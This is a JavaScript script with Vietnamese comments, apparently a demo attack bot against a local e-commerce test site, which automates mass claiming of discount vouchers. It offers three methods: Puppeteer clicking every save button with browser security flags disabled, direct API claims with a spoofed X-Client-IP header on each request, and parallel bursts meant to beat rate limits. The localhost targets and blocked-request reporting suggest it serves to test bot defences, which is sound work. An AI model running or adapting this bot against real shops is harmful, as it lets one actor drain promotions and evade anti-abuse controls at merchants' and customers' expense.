/**
 * 🤖 BOT TẤN CÔNG #1: SĂN VOUCHER TỰ ĐỘNG
 * 
 * Kịch bản: Bot điều khiển Chrome bằng Puppeteer để tự động:
 * - Vào trang http://localhost:3000/vouchers
 * - Click nút "Lưu" trên tất cả vouchers
 * - Vét sạch voucher trong vài giây
 * 
 * Cách chạy: node attacks/bot-voucher-hunter.js [1|2|3]
 */

const puppeteer = require('puppeteer');
const axios = require('axios');

// Cấu hình
const CONFIG = {
  FRONTEND_URL: 'http://localhost:3000',
  VOUCHER_PAGE: 'http://localhost:3000/vouchers',
  LOGIN_PAGE: 'http://localhost:3000/login',
  BACKEND_API: 'http://localhost:5000/api/user/coupons',
  NUMBER_OF_ATTACKS: 50,
  DELAY_BETWEEN_ATTACKS: 100,  // 100ms - quá nhanh cho con người
  
  // Thông tin đăng nhập (nếu cần)
  TEST_USER: {
    email: 'test@example.com',
    password: 'password123'
  }
};

// Lưu trữ vouchers đã săn được
const collectedVouchers = [];

/**
 * PHƯƠNG PHÁP 1: Tấn công qua UI với Puppeteer (Giống người dùng thật)
 * Bot mở Chrome, vào trang, click nút như người thật
 */
async function attackViaUI() {
  console.log('🎯 BẮT ĐẦU TẤN CÔNG QUA GIAO DIỆN UI...\n');
  console.log(`Target: ${CONFIG.VOUCHER_PAGE}`);
  console.log(`Phương pháp: Puppeteer điều khiển Chrome\n`);
  
  let browser;
  
  try {
    // Khởi động Chrome
    console.log('🚀 Đang khởi động Chrome...');
    browser = await puppeteer.launch({
      headless: false,  // false = hiện browser để xem, true = chạy ngầm
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process'
      ]
    });
    
    const page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });
    
    console.log('📱 Đang truy cập trang voucher...');
    await page.goto(CONFIG.VOUCHER_PAGE, { 
      waitUntil: 'networkidle0',
      timeout: 30000 
    });
    
    // Đợi 1 giây để trang load
    await sleep(1000);
    
    // Kiểm tra xem có bị redirect sang login không
    const currentUrl = page.url();
    if (currentUrl.includes('/login')) {
      console.log('⚠️  Cần đăng nhập! (Nếu trang yêu cầu authentication)');
      console.log('💡 Tip: Tắt authentication hoặc dùng phương pháp 2 (API trực tiếp)');
      return;
    }
    
    console.log('🔍 Đang tìm kiếm các nút "Lưu voucher"...\n');
    
    const startTime = Date.now();
    let clickCount = 0;
    
    // Vòng lặp click tất cả nút voucher
    for (let attempt = 1; attempt <= CONFIG.NUMBER_OF_ATTACKS; attempt++) {
      try {
        // Tìm tất cả nút "Lưu" (có thể là button với text "Lưu" hoặc icon)
        const buttons = await page.$$('button:not(:disabled)');
        
        if (buttons.length === 0) {
          console.log('✅ Không còn voucher nào để lấy!');
          break;
        }
        
        // Click nút đầu tiên
        const button = buttons[0];
        const buttonText = await page.evaluate(el => el.textContent, button);
        
        console.log(`🎯 [${attempt}] Đang click: "${buttonText.trim()}"...`);
        
        await button.click();
        clickCount++;
        
        // Đợi response
        await sleep(CONFIG.DELAY_BETWEEN_ATTACKS);
        
        // Kiểm tra toast notification
        const toastText = await page.evaluate(() => {
          const toast = document.querySelector('.Toastify__toast-body, .toast-body');
          return toast ? toast.textContent : null;
        });
        
        if (toastText) {
          if (toastText.includes('thành công') || toastText.includes('Đã lưu')) {
            console.log(`✅ [${attempt}] Thành công: ${toastText}`);
            collectedVouchers.push({ attempt, message: toastText });
          } else if (toastText.includes('thất bại') || toastText.includes('Lỗi')) {
            console.log(`❌ [${attempt}] Thất bại: ${toastText}`);
          }
        }
        
        // Reload trang để lấy danh sách mới
        await page.reload({ waitUntil: 'networkidle0' });
        await sleep(500);
        
      } catch (error) {
        console.log(`⚠️ [${attempt}] Lỗi: ${error.message}`);
      }
    }
    
    const endTime = Date.now();
    const duration = ((endTime - startTime) / 1000).toFixed(2);
    
    // Thống kê
    console.log('\n' + '='.repeat(60));
    console.log('📊 KẾT QUẢ TẤN CÔNG QUA UI');
    console.log('='.repeat(60));
    console.log(`⏱️  Thời gian: ${duration} giây`);
    console.log(`🖱️  Tổng clicks: ${clickCount}`);
    console.log(`✅ Vouchers săn được: ${collectedVouchers.length}`);
    console.log(`⚡ Click/giây: ${(clickCount / duration).toFixed(2)}`);
    console.log('='.repeat(60) + '\n');
    
  } catch (error) {
    console.error('❌ Lỗi nghiêm trọng:', error.message);
  } finally {
    if (browser) {
      console.log('🔒 Đóng browser...');
      await browser.close();
    }
  }
}

/**
 * PHƯƠNG PHÁP 2: Tấn công trực tiếp API (Không qua UI - NHANH HƠN)
 * Bot bỏ qua giao diện, gọi thẳng API backend
 */
async function attackDirectAPI() {
  console.log('🎯 BẮT ĐẦU TẤN CÔNG TRỰC TIẾP VÀO API...\n');
  console.log(`Target: ${CONFIG.BACKEND_API}`);
  console.log(`Phương pháp: Axios gọi API trực tiếp\n`);
  
  const startTime = Date.now();
  
  // Bước 1: Lấy danh sách vouchers
  try {
    console.log('📋 Đang lấy danh sách vouchers...');
    const vouchersResponse = await axios.get(`${CONFIG.BACKEND_API}/collectible`);
    const vouchers = vouchersResponse.data.vouchers || [];
    
    console.log(`✅ Tìm thấy ${vouchers.length} vouchers\n`);
    
    if (vouchers.length === 0) {
      console.log('❌ Không có voucher nào để săn!');
      return;
    }
    
    // Bước 2: Tấn công - lấy từng voucher
    for (let i = 0; i < Math.min(vouchers.length, CONFIG.NUMBER_OF_ATTACKS); i++) {
      const voucher = vouchers[i];
      
      try {
        console.log(`🎯 [${i + 1}/${vouchers.length}] Đang lấy voucher: ${voucher.Code}...`);
        
        // 🎯 Giả lập IP khác nhau cho mỗi request
        const fakeIP = `198.51.100.${Math.floor(Math.random() * 255)}`;
        
        const response = await axios.post(
          `${CONFIG.BACKEND_API}/claim`,
          { couponCode: voucher.Code },
          {
            headers: {
              'Content-Type': 'application/json',
              'X-Client-IP': fakeIP
              // Nếu cần token authentication, thêm vào đây
              // 'Authorization': 'Bearer YOUR_TOKEN'
            }
          }
        );
        
        if (response.data.success) {
          collectedVouchers.push(voucher);
          console.log(`✅ [${i + 1}] Săn được: ${voucher.Code} - ${voucher.DiscountType === 'Percent' ? voucher.DiscountValue + '%' : voucher.DiscountValue + '₫'} (IP: ${fakeIP})`);
        }
        
        // Delay nhỏ - quá nhanh so với người thật
        await sleep(CONFIG.DELAY_BETWEEN_ATTACKS);
        
      } catch (error) {
        if (error.response) {
          if (error.response.status === 403 || error.response.status === 429) {
            console.log(`🚫 [${i + 1}] BỊ CHẶN: ${error.response.data.reason || error.response.data.error}`);
            console.log('\n⛔ BOT ĐÃ BỊ PHÁT HIỆN VÀ CHẶN!\n');
            break;
          } else if (error.response.status === 401) {
            console.log(`❌ [${i + 1}] Cần đăng nhập`);
            break;
          } else {
            console.log(`❌ [${i + 1}] Lỗi: ${error.response.data.message}`);
          }
        } else {
          console.log(`❌ [${i + 1}] Lỗi kết nối: ${error.message}`);
        }
      }
    }
    
  } catch (error) {
    console.error('❌ Lỗi khi lấy danh sách:', error.message);
  }
  
  const endTime = Date.now();
  const duration = ((endTime - startTime) / 1000).toFixed(2);
  
  // Thống kê
  console.log('\n' + '='.repeat(60));
  console.log('📊 KẾT QUẢ TẤN CÔNG TRỰC TIẾP API');
  console.log('='.repeat(60));
  console.log(`⏱️  Thời gian: ${duration} giây`);
  console.log(`✅ Vouchers săn được: ${collectedVouchers.length}`);
  console.log(`📋 DANH SÁCH VOUCHERS:`);
  collectedVouchers.forEach((v, idx) => {
    const discount = v.DiscountType === 'Percent' 
      ? `${v.DiscountValue}%` 
      : `${Number(v.DiscountValue).toLocaleString('vi-VN')}₫`;
    console.log(`  ${idx + 1}. ${v.Code} - Giảm ${discount}`);
  });
  console.log('='.repeat(60) + '\n');
}

/**
 * PHƯƠNG PHÁP 3: Tấn công song song (PARALLEL - CỰC NHANH)
 * Gửi nhiều requests cùng lúc
 */
async function attackParallel() {
  console.log('🎯 BẮT ĐẦU TẤN CÔNG SONG SONG...\n');
  console.log(`⚠️  CẢNH BÁO: Sẽ gửi nhiều requests đồng thời!\n`);
  
  const startTime = Date.now();
  
  try {
    // Lấy danh sách vouchers
    const vouchersResponse = await axios.get(`${CONFIG.BACKEND_API}/collectible`);
    const vouchers = vouchersResponse.data.vouchers || [];
    
    console.log(`✅ Tìm thấy ${vouchers.length} vouchers`);
    console.log(`🚀 Đang gửi ${vouchers.length} requests đồng thời...\n`);
    
    // Tạo mảng promises - gửi tất cả cùng lúc
    const promises = vouchers.map((voucher, index) => {
      // 🎯 Giả lập IP khác nhau cho mỗi request
      const fakeIP = `192.0.2.${index % 255}`;
      
      return axios.post(
        `${CONFIG.BACKEND_API}/claim`,
        { couponCode: voucher.Code },
        {
          headers: { 
            'Content-Type': 'application/json',
            'X-Client-IP': fakeIP
          }
        }
      ).then(response => {
        console.log(`✅ [${index + 1}] Thành công: ${voucher.Code} (IP: ${fakeIP})`);
        return { success: true, voucher, ip: fakeIP };
      }).catch(error => {
        const status = error.response?.status;
        const message = error.response?.data?.message || error.message;
        console.log(`❌ [${index + 1}] Thất bại: ${message} (IP: ${fakeIP})`);
        return { success: false, error: message, status, ip: fakeIP };
      });
    });
    
    // Gửi TẤT CẢ cùng lúc
    const results = await Promise.all(promises);
    
    const successCount = results.filter(r => r.success).length;
    const blockedCount = results.filter(r => r.status === 403 || r.status === 429).length;
    
    const endTime = Date.now();
    const duration = ((endTime - startTime) / 1000).toFixed(2);
    
    console.log('\n' + '='.repeat(60));
    console.log('📊 KẾT QUẢ TẤN CÔNG SONG SONG');
    console.log('='.repeat(60));
    console.log(`⏱️  Thời gian: ${duration} giây`);
    console.log(`📤 Tổng requests: ${vouchers.length}`);
    console.log(`✅ Thành công: ${successCount}`);
    console.log(`🚫 Bị chặn: ${blockedCount}`);
    console.log(`❌ Thất bại khác: ${results.length - successCount - blockedCount}`);
    console.log('='.repeat(60) + '\n');
    
  } catch (error) {
    console.error('❌ Lỗi:', error.message);
  }
}

// Helper function
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Menu chọn phương pháp tấn công
async function main() {
  console.log('\n' + '='.repeat(60));
  console.log('🤖 BOT SĂN VOUCHER - DEMO ATTACK');
  console.log('='.repeat(60));
  console.log('Chọn phương pháp tấn công:');
  console.log('1. Tấn công qua UI với Puppeteer (Giống người - chậm hơn)');
  console.log('2. Tấn công trực tiếp API (Bỏ qua UI - nhanh nhất)');
  console.log('3. Tấn công song song (Parallel - nguy hiểm nhất)');
  console.log('='.repeat(60) + '\n');
  
  const method = process.argv[2] || '2';
  
  switch(method) {
    case '1':
      await attackViaUI();
      break;
    case '2':
      await attackDirectAPI();
      break;
    case '3':
      await attackParallel();
      break;
    default:
      console.log('❌ Phương pháp không hợp lệ');
      console.log('Sử dụng: node bot-voucher-hunter.js [1|2|3]');
  }
}

// Chạy
main();
